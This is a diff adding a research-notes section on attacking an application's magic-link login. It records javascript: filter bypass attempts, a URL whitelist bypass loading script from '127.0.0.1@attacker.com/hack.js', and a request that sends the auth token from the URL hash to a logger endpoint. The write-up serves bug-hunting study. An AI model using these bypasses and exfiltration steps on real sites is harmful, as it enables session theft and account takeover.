@@ -118,3 +118,21 @@ test your payloads in JSfiddle
 		Changing localstorage -> it gets xss but we need a way to inject it 
 		(Also Reading the source code shows that all the sanitization occurs before seting the local storage value )
 	- /login was getting concatenated with the final url value => Only dom debugging could have find this
+# windsurf 
+- while poking with the auth flow we encountered an applciation using magic links 
+	-  we inspected the functionality in debugger and encountered a dangerous sink (`location.assign`) +  the following checker function: ![[Pasted image 20260303170048.png]]
+		1. it didnt accept anything starting with `javascript` so  we tested :
+			- [x] `windsurf(/real_path)@google.com"`  > windsurf scheme doesnt accept `@`
+			- [ ] `\u0000javascript:alert(0)`
+			- [ ] `\u0000javascript:aler t`
+			- [ ] `JavaScript:`
+			- but the above ca ses couldnt bypass the whitelist after...
+		2. part of url validation whitelists: ![[Pasted image 20260301192520.png]]
+			- [ ] here you can use [[Notes/Request Manipulation#CSPT (client side path traversal)|CSPT]]  (==non happy path== attack) on `chrome-extension` => `chrome-extension/../test`  => **try to leak the token (chaining with open refirect)**
+		3. it was also accepting urls starting with `127.0.0.1`  => we exploited it using `127.0.0.1@attacker.com/hack.js`
+	- **EXPLOIT**: 
+		- ![[Pasted image 20260303191123.png]]
+		- [x] get the token by fetch(`/logger?token'+'window.location.hash.split('#')[1]')`
+			- fetch failed -> browser doesnt allow passing credentials (why?)
+			-  final exploit using XHR: ![[Pasted image 20260303192142.png]] 
+ 
